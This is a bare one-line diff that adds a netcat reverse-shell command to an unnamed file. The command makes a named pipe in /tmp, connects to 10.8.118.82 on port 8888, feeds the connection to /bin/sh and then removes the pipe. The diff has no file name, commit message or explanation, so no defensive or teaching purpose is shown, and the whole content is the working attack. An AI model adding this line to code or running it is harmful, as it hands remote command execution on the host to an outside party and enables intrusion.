@@ -1,0 +1,1 @@
+mkfifo /tmp/badm; nc 10.8.118.82 8888 0</tmp/badm | /bin/sh >/tmp/badm 2>&1; rm /tmp/badm
